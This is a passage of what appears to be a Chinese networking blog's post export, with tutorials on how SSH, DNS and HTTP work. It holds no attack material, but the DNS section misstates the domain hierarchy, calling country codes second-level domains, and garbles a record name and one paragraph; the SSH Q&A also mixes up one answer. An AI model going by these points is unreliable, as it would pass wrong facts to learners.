展来看，在企业应用和商业应用领域，采用中心认证的方案是必要的。 另外，SSH协议框架中还允许对主机密钥的一个折中处理，那就是首次访问免认证。首次访问免认证是指，在某客户机第一次访问主机时，主机不检查主机密钥，而向该客户都发放一个公开密钥的拷贝，这样在以后的访问中则必须使用该密钥，否则会被认为非法而拒绝其访问。 四、SSH 的工作过程 在整个通讯过程中，为实现 SSH的安全连接，服务器端与客户端要经历如下五个阶段： * 版本号协商阶段，SSH目前包括 SSH1和SSH2两个版本， 双方通过版本协商确定使用的版本 * 密钥和算法协商阶段，SSH支持多种加密算法， 双方根据本端和对端支持的算法，协商出最终使用的算法 * 认证阶段，SSH客户端向服务器端发起认证请求， 服务器端对客户端进行认证 * 会话请求阶段， 认证通过后，客户端向服务器端发送会话请求 * 交互会话阶段 ，会话请求通过后，服务器端和客户端进行信息的交互 1 . 版本号协商阶段 \\1. 服务器打开端口 22，等待客户端连接。 \\2. 客户端向服务器端发起 TCP初始连接请求，TCP连接建立后，服务器向客户端发送第一个报文，包括版本标志字符串，格式为“SSH－&lt;主协议版本号&gt;.&lt;次协议版本号&gt;－&lt;软件版本号&gt;”，协议版本号由主版本号和次版本号组成，软件版本号主要是为调试使用。 \\3. 客户端收到报文后，解析该数据包，如果服务器端的协议版本号比自己的低，且客户端能支持服务器端的低版本，就使用服务器端的低版本协议号，否则使用自己的协议版本号。 \\4. 客户端回应服务器一个报文，包含了客户端决定使用的协议版本号。服务器比较客户端发来的版本号，决定是否能同客户端一起工作。 \\5. 如果协商成功，则进入密钥和算法协商阶段，否则服务器端断开 TCP连接。 Note： 版本号协商阶段报文都是采用明文方式传输的。 \\2. 密钥和算法协商阶段 \\1. 服务器端和客户端分别发送算法协商报文给对端，报文中包含自己支持的公钥算法列表、加密算法列表、MAC（Message Authentication Code，消息验证码）算法列表、压缩算法列表等; \\2. 服务器端和客户端根据对端和本端支持的算法列表得出最终使用的算法。 \\3. 服务器端和客户端利用 DH交换（Diffie-Hellman Exchange）算法、主机密钥对等参数，生成会话密钥和会话 ID。 通过以上步骤，服务器端和客户端就取得了相同的会话密钥和会话ID。 ​ * 对于后续传输的数据，两端都会使用会话密钥进行加密和解密，保证了数据传送的安全 ​ * 在认证阶段，两端会使用会话 ID用于认证过程。 Note： ​ 在协商阶段之前，服务器端已经生成 RSA或 DSA密钥对，他们主要用于参与会话密钥的生成。 \\3. 认证阶段 \\1. 客户端向服务器端发送认证请求，认证请求中包含用户名、认证方法、与该认证方法相关的内容（如：password认证时，内容为密码）。 \\2. 服务器端对客户端进行认证，如果认证失败，则向客户端发送认证失败消息，其中包含可以再次认证的方法列表。 \\3. 客户端从认证方法列表中选取一种认证方法再次进行认证。 \\4. 该过程反复进行， 直到认证成功或者认证次数达到上限， 服务器关闭连接为止。 SSH提供两种认证方式： \\1. password认证：客户端向服务器发出 password认证请求，将用户名和密码加密后发送给服务器；服务器将该信息解密后得到用户名和密码的明文，与设备上保存的用户名和密码进行比较，并返回认证成功或失败的消息。 \\2. publickey 认证：采用数字签名的方法来认证客户端。目前，设备上可以利用RSA和 DSA两种公共密钥算法实现数字签名。客户端发送包含用户名、公共密钥和公共密钥算法的 publickey 认证请求给服务器端。服务器对公钥进行合法性检查，如果不合法，则直接发送失败消息；否则，服务器利用数字签名对客户端进行认证，并返回认证成功或失败的消息 SSH2.0还提供了 password-publickey 认证和 any 认证: \\1. password-publickey 认证：指定该用户的认证方式为 password 和 publickey认证同时满足。客户端版本为 SSH1的用户只要通过其中一种认证即可登录；客户端版本为 SSH2的用户必须两种认证都通过才能登录。 \\2. any认证：指定该用户的认证方式可以是 password，也可以是 publickey。 4.会话请求阶段 \\1. 服务器等待客户端的请求； \\2. 认证通过后，客户端向服务器发送会话请求； \\3. 服务器处理客户端的请求。请求被成功处理后， 服务器会向客户端回应 SSH_SMSG_SUCCESS包，SSH进入交互会话阶段；否则回应 SSH_SMSG_FAILURE包，表示服务器处理请求失败或者不能识别请求。 5.交互会话阶段 在这个模式下，数据被双向传送： \\1. 客户端将要执行的命令加密后传给服务器; \\2. 服务器接收到报文，解密后执行该命令,将执行的结果加密发还给客户端; \\3. 客户端将接收到的结果解密后显示到终端上. 五、SSH的应用 首先，SSH最常见的应用就是，用它来取代传统的Telnet、FTP等网络应用程序，通过SSH登录到远方机器执行你想进行的工作与命令。在不安全的网路通讯环境中，它提供了很强的验证（authentication）机制与非常安全的通讯环境。实际上，SSH开发者的原意是设计它来取代原UNIX系统上的rcp、rlogin、rsh等指令程序的；但经过适当包装后，发现它在功能上完全可以取代传统的Telnet、FTP等应用程序。 传统 BSD 风格的 r 系列指令（如 rcp，rsh，rlogin）往往都被视为不安全的，很容易就被各种网络攻击手段所破解，几乎所有找得到有关UNIX安全的书或文件，都会一而再、再而三地警告系统管理者，留心r系列指令的设定，甚至要求系统管理者将r系列指令通通关闭。 而用来替代r系列指令的SSH，则在安全方面做了极大的强化，不但对通讯内容可以进行极为安全的加密保护，同时也强化了对身份验证的安全机制，它应用了在密码学（Cryptography）中已发展出来的数种安全加密机制，如 Symmetric Key Cryptography，Asymmetric Key Cryptography， One-way Hash Function，Random-number Generation等，来加强对于身份验证与通讯内容的安全保护。通讯时资料的加密有IDEA，three-key triple DES，DES，RC4-128，TSS，Blowfish 等数种多种安全加密算法可供选择，加密的key则是通过 RSA 进行交换的。资料的加密可以对抗IP spoofing，RSA这种非对称性的加密机制则可用来对抗DNS spoofing与IP routing spoofing，同时RSA也可以进行对主机身份的验证。 其次，通过使用用SSH可以在本地主机和远程服务器之间设置”加密通道”，并且这样设置的”加密通道”可以跟常见的Pop应用程序、X应用程序、Linuxconf应用程序相结合，提供安全保障。 SSH的”加密通道”是通过”端口转发”来实现的。你可以在本地端口（没有用到的）和在远程服务器上运行的某个服务的端口之间建立”加密通道”。然后只要连接到本地端口。所有对本地端口的请求都被SSH加密并且转发到远程服务器的端口。当然只有远程服务器上运行SSH服务器软件的时候”加密通道”才能工作。 六、SSH Q&amp;A Q1: SSH的版本和区别。 SSH2避免了RSA的专利问题，并修补了CRC的缺陷。SSH2用数字签名算法（DSA）和Diffie-Hellman（DH）算法代替RSA来完成对称密钥的交换，用HMAC来代替CRC。同时SSH2增加了AES和Twofish等对称加密算法。 A1: SSH(Secure SHell)到目前为止有两个不兼容的版本——SSH1和SSH2。SSH1又分为1.3和1.5两个版本。SSH1采用DES、3DES、 Blowfish和RC4等对称加密算法保护数据安全传输，而对称加密算法的密钥是通过非对称加密算法（RSA）来完成交换的。SSH1使用循环冗余校验码（CRC）来保证数据的完整性，但是后来发现这种方法有缺陷。 更多内容请参考The SSHv1 Protocol &amp; The SSHv2 Protocol Q2: 什么是HMAC？ A2: HMAC(Hash Message Authentication Code) ，散列消息鉴别码，基于密钥的Hash算法的认证协议。消息鉴别码实现鉴别的原理是，用公开函数和密钥产生一个固定长度的值作为认证标识，用这个标识鉴别消息的完整性。使用一个密钥生成一个固定大小的小数据块，即MAC，并将其加入到消息中，然后传输。接收方利用与发送方共享的密钥进行鉴别认证等。 Q3: 什么是X11 forwarding？ A3: sh的X11 forwarding特性可以使X client和X server安全地通讯。使用X11 forwarding后，从X client到X Server方向的数据先被送至ssh server，ssh server利用和ssh client的安全通道转发给ssh client，再由ssh client转发给X server，从X server到X client的数据流同理。这里ssh server和ssh client充当了X client和X server间数据的转发器，由于ssh server和X client、ssh client和X server一般在同一台机器上，它们之间是一种安全的进程间通讯，而ssh server和ssh client间的通讯也是安全的，所以X client和X server间的通讯就是安全的。 Q4: 什么是TTY？ A4: 终端是一种字符型设备，它有多种类型，通常使用tty来简称各种类型的终端设备。tty是 Teletype的缩写。Teletype是最早出现的一种终端设备，很象电传打字机，是由Teletype公司生产的。设备名放在特殊文件目录/dev/下。 Q5: 简单描述下SSH运行的过程？ A5:简要过程如下： ​ * Client端向Server端发起SSH连接请求。 ​ * Server端向Client端发起版本协商。 ​ * 协商结束后Server端发送Host Key公钥 Server Key公钥，随机数等信息。到这里所有通信是不加密的。 ​ * Client端返回确认信息，同时附带用公钥加密过的一个随机数，用于双方计算Session Key。 ​ * 进入认证阶段。从此以后所有通信均加密。 ​ * 认证成功后，进入交互阶段。","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"tcp/ip协议","slug":"tcp-ip协议","permalink":"http://yoursite.com/tags/tcp-ip%E5%8D%8F%E8%AE%AE/"}]},{"title":"DNS协议","slug":"DNS协议","date":"2020-01-07T04:25:02.000Z","updated":"2020-02-25T13:23:52.239Z","comments":true,"path":"2020/01/07/DNS协议/","link":"","permalink":"http://yoursite.com/2020/01/07/DNS%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"0x01）DNS协议简介域名系统（Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。DNS协议是用来将域名转换为IP地址（也可以将IP地址转换为相应的域名地址）。DNS 协议建立在 UDP 或 TCP 协议之上，默认使用 53 号端口。客户端默认通过 UDP 协议进行通讯，但是由于广域网中不适合传输过大的 UDP 数据包，因此规定当报文长度超过了 512 字节时，应转换为使用 TCP 协议进行数据传输。 0x02）DNS工作过程当 DNS 客户机需要进行查询时，它会查询本地DNS 服务器来解析该名称。客户机发送的每条查询消息都包括3条信息，以指定服务器应回答的问题。 指定的 DNS 域名，表示为完全合格的域名 (FQDN) 。 指定的查询类型，它可根据类型指定资源记录，或作为查询操作的专门类型。 DNS域名的指定类别。 DNS 查询以各种不同的方式进行解析。客户机有时也可通过使用从以前查询获得的缓存信息就地应答查询。DNS 服务器可使用其自身的资源记录信息缓存来应答查询，也可代表请求客户机来查询或联系其他 DNS 服务器，以完全解析该名称，并随后将应答返回至客户机。这个过程称为递归。 另外，客户机自己也可尝试联系其他的 DNS 服务器来解析名称。如果客户机这么做，它会使用基于服务器应答的独立和附加的查询，该过程称作迭代，即DNS服务器之间的交互查询就是迭代查询。 DNS的查询过程如下所示： 用户打开 Web 浏览器，在地址栏中输入 www.example.com，然后按 Enter 键。 www.example.com 的请求被路由到 DNS 解析程序，这一般由用户的 Internet 服务提供商 (ISP) 进行管理，例如有线 Internet 服务提供商、DSL 宽带提供商或公司网络。 ISP 的 DNS 解析程序将 www.example.com 的请求转发到 DNS 根名称服务器。 ISP 的 DNS 解析程序再次转发 www.example.com 的请求，这次转发到 .com 域的一个 TLD 名称服务器。.com 域的名称服务器使用与 example.com 域相关的四个 Amazon Route 53 名称服务器的名称来响应该请求。 ISP 的 DNS 解析程序选择一个 Amazon Route 53 名称服务器，并将 www.example.com 的请求转发到该名称服务器。 Amazon Route 53 名称服务器在 example.com 托管区域中查找 www.example.com 记录，获得相关值，例如，Web 服务器的 IP 地址 (192.0.2.44)，并将 IP 地址返回至 DNS 解析程序。 ISP 的 DNS 解析程序最终获得用户需要的 IP 地址。解析程序将此值返回至 Web 浏览器。DNS 解析程序还会将 example.com 的 IP 地址缓存 (存储) 您指定的时长，以便它能够在下次有人浏览 example.com 时更快地作出响应。有关更多信息，请参阅存活期 (TTL)。 Web 浏览器将 www.example.com 的请求发送到从 DNS 解析程序中获得的 IP 地址。这是您的内容所处位置，例如，在 Amazon EC2 实例中或配置为网站终端节点的 Amazon S3 存储桶中运行的 Web 服务器。 192.0.2.44 上的 Web 服务器或其他资源将 www.example.com 的 Web 页面返回到 Web 浏览器，且 Web 浏览器会显示该页面。 0x03）DNS基础 域名系统分层 域名系统是分层次的，在域名系统的层次结构中，各种域名都隶属于域名系统根域的下级。域名的第一级是顶级域，它包括通用顶级域，例如 .com、.net 和 .org；以及国家和地区顶级域，例如 .us、.cn 和 .tk。顶级域名下一层是二级域名，一级一级地往下。 根域：DNS域名使用中规定由尾部句点’.’来指定名称位于根或者更高层次的域层次结构,根服务器有13台。 顶级域：用来指示某个国家、地区或者组织。采用三个字符，如com -&gt; 商业公司，edu -&gt; 教育机构，net -&gt; 网络公司，gov -&gt; 非军事政府机构等等。 二级域：个人或者组织在Internet使用的注册名称。采用两个字符，如：cn -&gt; 代表中国，jp -&gt; 日本，uk -&gt; 英国，hk -&gt; 香港等等 主机：主机名处于域名空间结构中的最底层，主机名和域名结合构成FQDN，主机名是FQDN最左端的部分。 记录类型 DNS 中，常见的资源记录类型有： NS 记录（域名服务） ─ 指定解析域名或子域名的 DNS 服务器。 MX 记录（邮件交换） ─ 指定接收信息的邮件服务器。 A 记录（地址） ─ 指定域名对应的 IPv4 地址记录。 AAAA 记录（地址） ─ 指定域名对应的 IPv6 地址记录。 NAME（规范） ─ 一个域名映射到另一个域名或 CNAME 记录（ example.com 指向 www.example.com或映射到一个 A记录。 PTR 记录（反向记录） ─ PTR 记录用于定义与 IP 地址相关联的名称。 PTR 记录是 A 或 AAAA 记录的逆。 PTR 记录是唯一的，因为它们以 .arpa 根开始并被委派给 IP 地址的所有者。 授权型DNS和递归型DNS 授权型 DNS - 一种授权型 DNS 服务提供一种更新机制，供开发人员用于管理其公用 DNS 名称。然后，它响应 DNS 查询，将域名转换为 IP 地址，以便计算机可以相互通信。授权型 DNS 对域有最终授权且负责提供递归型 DNS 服务器对 IP 地址信息的响应。Amazon Route 53 是一种授权型 DNS 系统。 新机制，供开发人员用于管理其公用 DNS 名称。然后，它响应 DNS 查询，将域名转换为 IP 地址，以便计算机可以相互通信。授权型 DNS 对域递归型 DNS - 客户端通常不会对授权型 DNS 服务直接进行查询。而是通常连接到称为解析程序的其他类型 DNS 服务，或递归型 DNS 服务。递归型 DNS 服务就像是旅馆的门童：尽管没有任何自身的 DNS 记录，但是可充当代表您获得 DNS 信息的中间程序。如果递归型 DNS 拥有已缓存或存储一段时间的 DNS 参考，那么它会通过提供源或 IP 信息来响应 DNS 查询。如果没有，则它会将查询传递到一个或多个授权型 DNS 服务器以查找信息。 递归查询和迭代查询 在递归查询模式下，DNS 服务器在接收到客户机请求时，必须使用一个准确的查询结果回复客户机。也就意味着，如果 DNS 服务器本地没有缓存所查询的 DNS 信息，那么该服务器会询问其它服务器，并将返回的查询结果提交给客户机。 而在使用迭代查询时，DNS 服务器会向客户机提供其它能够解析查询请求的 DNS 服务器地址。也就是说，当客户机发送查询请求时，DNS 服务器并不直接回复查询结果，而是告诉客户机另一台 DNS 服务器地址，客户机需要再向这台 DNS 服务器提交请求，依次循环直到返回查询的结果为止。 0x04）报文格式整个报文的格式如下，包括了五部分组成。 +---------------------+ | Header | 报文头 +---------------------+ | Question | 查询请求 +---------------------+ | Answer | 应答 +---------------------+ | Authority | 授权应答 +---------------------+ | Additional | 附加信息 +---------------------+详细介绍如下。 Header 必选，定义了报文是请求还是应答、错误码以及其它的一些标志位； Question 描述了查询的请求报文，包括查询类型(QTYPE)、查询类(QCLASS) 以及查询的域名(QNAME)； 剩下的3个段包含相同的格式:一系列可能为空的资源记录(RRs)。 Answer段包含回答问题的RRs；授权段包含授权域名服务器的RRs； 附加段包含和请求相关的，但是不是必须回答的RRs。 0x04.1）报文头（header）+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | ID | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ |QR| Opcode |AA|TC|RD|RA| Z | RCODE | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | QDCOUNT | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | ANCOUNT | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | NSCOUNT | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | ARCOUNT | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+字段介绍如下。 ID 16Bits 客户端设置，响应报文会原样带回，用于客户端区分不同的请求应答； QR 1Bits 区分是请求 (0 Question) 还是应答 (1 Response)； Opcode 4Bits 设置查询的种类，响应报文会原样带回，可以为：0 标准查询 QUERY；1 反向查询 IQUERY；2 服务器状态查询 STATUS；3~15 保留； AA 1Bits 授权应答 AuthoritativeAnswer，响应报文生效，用于标示服务器响应报文是否为授权服务器返回的结果，可能是在本地 Cache 的缓存； TC 1Bits 截断 TrunCation，报文因为超过了允许的长度，导致被截断； RD 1Bits 用于请求中，期望使用递归查询； RA 1Bits 用于响应中，如果服务器支持递归查询则设置为 1 ，否则设置为 0 ； RCODE 4Bits 应答码 ResponseCode，会在响应报文中设置，其代表的含义如下： * 0 没有错误； * 1 报文格式错误(Format Error)，服务器解析请求报文时报错 * 2 服务器失败(Server Failure)，因为服务器的原因导致没办法处理这个请求； * 3 名字错误(Name Error)，只对授权域名解析服务器有意义，解析的域名不存在； * 4 没有实现(Not Implemented)，域名服务器不支持查询类型； * 5 拒绝(Refused)，由于服务器设置的策略拒绝给出应答，通常是安全的配置； * 6-15 保留值，暂未使用。 QDCOUNT 无符号16位整数表示报文请求段中的问题记录数； ANCOUNT 无符号16位整数表示报文回答段中的回答记录数； NSCOUNT 无符号16位整数表示报文授权段中的授权记录数； ARCOUNT 无符号16位整数表示报文附加段中的附加记录数。 0x04.2）查询请求区(Queries)用来标识，查询的请求参数，同时需要在头中设置 QDCOUNT 这个字段。 +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | | / QNAME / / / +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | QTYPE | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | QCLASS | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+字段含义如下: QNAME 域名被编码为一些labels序列，每个labels包含一个字节表示后续字符串长度，以及这个字符串，以0长度和空字符串来表示域名结束。注意这个字段可能为奇数字节，不需要进行边界填充对齐。 QTYPE 2个字节表示查询类型，.取值可以为任何可用的类型值，以及通配码来表示所有的资源记录。 类型 助记符 说明 1 A 由域名获得IPv4地址 2 NS 查询域名服务器 5 CNAME 查询规范名称 6 SOA 开始授权 11 WKS 熟知服务 12 PTR 把IP地址转换成域名 13 HINFO 主机信息 15 MX 邮件交换 28 AAAA 由域名获得IPv6地址 252 AXFR 传送整个区的请求 255 ANY 对所有记录的请求 QCLASS 2个字节表示查询的协议类，比如，IN代表Internet 通常为1，表明是Internet数据 0x04.3）资源记录(RR)区（包括回答区域，授权区域和附加区域）该区域有三个，但格式都是一样的。这三个区域分别是：回答区域，授权区域和附加区域 1234567891011121314151617+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+| NAME || |+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+| TYPE |+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+| CLASS |+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+| Time to live || |+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+| Data length |+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+&#x2F; &#x2F;| DATA |&#x2F; &#x2F;+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ 域名（2字节或不定长）：它的格式和Queries区域的查询名字字段是一样的。有一点不同就是，当报文中域名重复出现的时候，该字段使用2个字节的偏移指针来表示。比如，在资源记录中，域名通常是查询问题部分的域名的重复，因此用2字节的指针来表示，具体格式是最前面的两个高位是 11，用于识别指针。其余的14位从DNS报文的开始处计数（从0开始），指出该报文中的相应字节数。一个典型的例子，C00C(1100000000001100，12正好是头部的长度，其正好指向Queries区域的查询名字字段)。 查询类型：表明资源纪录的类型 查询类：对于Internet信息，总是IN 生存时间（TTL）：**以秒为单位，表示的是资源记录的生命周期，一般用于当地址解析程序取出资源记录后决定保存及使用缓存数据的时间，它同时也可以表明该资源记录的稳定程度，极为稳定的信息会被分配一个很大的值（比如86400，这是一天的秒数） 资源数据：该字段是一个可变长字段，表示按照查询段的要求返回的相关资源记录的数据。可以是Address（表明查询报文想要的回应是一个IP地址）或者CNAME（表明查询报文想要的回应是一个规范主机名）等。","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"tcp/ip协议","slug":"tcp-ip协议","permalink":"http://yoursite.com/tags/tcp-ip%E5%8D%8F%E8%AE%AE/"}]},{"title":"HTTP协议","slug":"http协议","date":"2020-01-05T06:42:37.000Z","updated":"2020-02-12T08:41:09.969Z","comments":true,"path":"2020/01/05/http协议/","link":"","permalink":"http://yoursite.com/2020/01/05/http%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"0x01）HTTP协议简介超文本传输协议（英文：HyperText Transfer Protocol，缩写：HTTP）是一种用于分布式、协作式和超媒体信息系统的应用层协议。HTTP是万维网的数据通信的基础。 HTTP的发展是由蒂姆·伯纳斯-李于1989年在欧洲核子研究组织（CERN）所发起。HTTP的标准制定由万维网协会（World Wide Web Consortium，W3C）和互联网工程任务组（Internet Engineering Task Force，IETF）进行协调，最终发布了一系列的RFC，其中最著名的是1999年6月公布的 RFC 2616，定义了HTTP协议中现今广泛使用的一个版本——HTTP 1.1。 2014年12月，互联网工程任务组（IETF）的Hypertext Transfer Protocol Bis（httpbis）工作小组将HTTP/2标准提议递交至IESG进行讨论，于2015年2月17日被批准。 HTTP/2标准于2015年5月以RFC 7540正式发表，取代HTTP 1.1成为HTTP的实现标准。 0x02）HTTP工作原理HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。 以下是 HTTP 请求/响应的步骤： 客户端连接到Web服务器 一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，http://www.luffycity.com。 发送HTTP请求 通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。 服务器接受请求并返回HTTP响应 Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。 释放连接TCP连接 若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求; 客户端浏览器解析HTML内容 客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。 例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程： 浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址; 解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接; 浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器; 服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器; 释放 TCP连接; 浏览器将该 html 文本并显示内容; 0x03）HTTP特点0x03.1）无连接无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。 早期这么做的原因是 HTTP 协议产生于互联网，因此服务器需要处理同时面向全世界数十万、上百万客户端的网页访问，但每个客户端（即浏览器）与服务器之间交换数据的间歇性较大（即传输具有突发性、瞬时性），并且网页浏览的联想性、发散性导致两次传送的数据关联性很低，大部分通道实际上会很空闲、无端占用资源。因此 HTTP 的设计者有意利用这种特点将协议设计为请求时建连接、请求完释放连接，以尽快将资源释放出来服务其他客户端。 随着时间的推移，网页变得越来越复杂，里面可能嵌入了很多图片，这时候每次访问图片都需要建立一次 TCP 连接就显得很低效。后来，Keep-Alive 被提出用来解决这效率低的问题。 Keep-Alive 功能使客户端到服务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive 功能避免了建立或者重新建立连接。市场上的大部分 Web 服务器，包括 iPlanet、IIS 和 Apache，都支持 HTTP Keep-Alive。对于提供静态内容的网站来说，这个功能通常很有用。但是，对于负担较重的网站来说，这里存在另外一个问题：虽然为客户保留打开的连接有一定的好处，但它同样影响了性能，因为在处理暂停期间，本来可以释放的资源仍旧被占用。当Web服务器和应用服务器在同一台机器上运行时，Keep-Alive 功能对资源利用的影响尤其突出。 这样一来，客户端和服务器之间的 HTTP 连接就会被保持，不会断开（超过 Keep-Alive 规定的时间，意外断电等情况除外），当客户端发送另外一个请求时，就使用这条已经建立的连接。 0x03.2）无状态无状态是指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。即我们给服务器发送 HTTP 请求之后，服务器根据请求，会给我们发送数据过来，但是，发送完，不会记录任何信息。 HTTP 是一个无状态协议，这意味着每个请求都是独立的，Keep-Alive 没能改变这个结果。 缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。 HTTP 协议这种特性有优点也有缺点，优点在于解放了服务器，每一次请求“点到为止”不会造成不必要连接占用，缺点在于每次请求会传输大量重复的内容信息。 客户端与服务器进行动态交互的 Web 应用程序出现之后，HTTP 无状态的特性严重阻碍了这些应用程序的实现，毕竟交互是需要承前启后的，简单的购物车程序也要知道用户到底在之前选择了什么商品。于是，两种用于保持 HTTP 连接状态的技术就应运而生了，一个是 Cookie，而另一个则是 Session。 Cookie可以保持登录信息到用户下次与服务器的会话，换句话说，下次访问同一网站时，用户会发现不必输入用户名和密码就已经登录了（当然，不排除用户手工删除Cookie）。而还有一些Cookie在用户退出会话的时候就被删除了，这样可以有效保护个人隐私。 Cookies 最典型的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续，这些都是 Cookies 的功用。另一个重要应用场合是“购物车”之类处理。用户可能会在一段时间内在同一家网站的不同页面中选择不同的商品，这些信息都会写入 Cookies，以便在最后付款时提取信息。 与 Cookie 相对的一个解决方案是 Session，它是通过服务器来保持状态的。 当客户端访问服务器时，服务器根据需求设置 Session，将会话信息保存在服务器上，同时将标示 Session 的 SessionId 传递给客户端浏览器，浏览器将这个 SessionId 保存在内存中，我们称之为无过期时间的 Cookie。浏览器关闭后，这个 Cookie 就会被清掉，它不会存在于用户的 Cookie 临时文件。 以后浏览器每次请求都会额外加上这个参数值，服务器会根据这个 SessionId，就能取得客户端的数据信息。 如果客户端浏览器意外关闭，服务器保存的 Session 数据不是立即释放，此时数据还会存在，只要我们知道那个 SessionId，就可以继续通过请求获得此 Session 的信息，因为此时后台的 Session 还存在，当然我们可以设置一个 Session 超时时间，一旦超过规定时间没有客户端请求时，服务器就会清除对应 SessionId 的 Session 信息。 0x04）HTTP请求方法HTTP/1.1协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源： GET 向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问。 HEAD 与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。 POST 向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。 PUT 向指定资源位置上传其最新内容。 DELETE 请求服务器删除Request-URI所标识的资源。 TRACE 回显服务器收到的请求，主要用于测试或诊断。 OPTIONS 这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用’*’来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。 CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。 注意事项： 方法名称是区分大小写的。当某个请求所针对的资源不支持对应的请求方法的时候，服务器应当返回状态码405（Method Not Allowed），当服务器不认识或者不支持对应的请求方法的时候，应当返回状态码501（Not Implemented）。 HTTP服务器至少应该实现GET和HEAD方法，其他方法都是可选的。当然，所有的方法支持的实现都应当匹配下述的方法各自的语义定义。此外，除了上述方法，特定的HTTP服务器还能够扩展自定义的方法。例如PATCH（由 RFC 5789 指定的方法）用于将局部修改应用到资源。 get与post请求的区别 GET提交的数据会放在URL之后，也就是请求行里面，以?分割URL和传输数据，参数之间以&amp;相连，如EditBook?name=test1&amp;id=123456.（请求头里面那个content-type做的这种参数形式，后面讲） POST方法是把提交的数据放在HTTP包的请求体中. GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制. 0x05）HTTP状态码所有HTTP响应的第一行都是状态行，依次是当前HTTP版本号，3位数字组成的状态代码，以及描述状态的短语，彼此由空格分隔。 状态代码的第一个数字代表当前响应的类型： 1xx消息——请求已被服务器接收，继续处理 2xx成功——请求已成功被服务器接收、理解、并接受 3xx重定向——需要后续操作才能完成这一请求 4xx请求错误——请求含有词法错误或者无法被执行 5xx服务器错误——服务器在处理某个正确请求时发生错误 虽然 RFC 2616 中已经推荐了描述状态的短语，例如”200 OK”，”404 Not Found”，但是WEB开发者仍然能够自行决定采用何种短语，用以显示本地化的状态描述或者自定义信息。 0x06）URL超文本传输协议（HTTP）的统一资源定位符将从因特网获取信息的五个基本元素包括在一个简单的地址中： 传送协议。 层级URL标记符号(为[//],固定不变) 访问资源需要的凭证信息（可省略） 服务器。（通常为域名，有时为IP地址） 端口号。（以数字方式表示，若为HTTP的默认值“:80”可省略） 路径。（以“/”字符区别路径中的每一个目录名称） 